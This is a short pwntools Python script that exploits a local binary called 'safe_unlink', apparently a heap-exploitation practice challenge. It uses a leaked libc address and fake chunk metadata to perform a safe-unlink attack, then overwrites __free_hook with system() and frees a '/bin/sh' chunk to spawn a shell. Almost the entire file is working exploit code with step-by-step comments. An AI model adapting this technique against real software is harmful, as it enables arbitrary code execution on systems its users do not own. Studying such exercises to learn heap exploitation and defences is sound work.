#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "free" option; send index.
def free(index):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Print the address of m_array, where the program stores pointers to its allocated chunks.
log.info(f"m_array @ 0x{elf.sym.m_array:02x}")

m_arr = elf.sym.m_array

# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
fd = m_arr - 0x18
bk = m_arr - 0x10

prev_size = 0x90-0x10
fake_size = 0x90

edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*(0x60) + p64(prev_size) + p64(fake_size))

# force backward consolidation
free(chunk_B)

# override m_array stored pointer
edit(chunk_A, p8(0)*0x18 +  p64(libc.sym.__free_hook-0x08))

edit(chunk_A, b"/bin/sh\0" + p64(libc.sym.system))

# chunk_A is now pointing the _free_hook-0x08 which is a char pointer to "/bin/sh", the next 8 bytes are overriden with system()
# Hence, system will be called with "/bin/sh\0" as a first argument

free(chunk_A)

# =============================================================================

io.interactive()
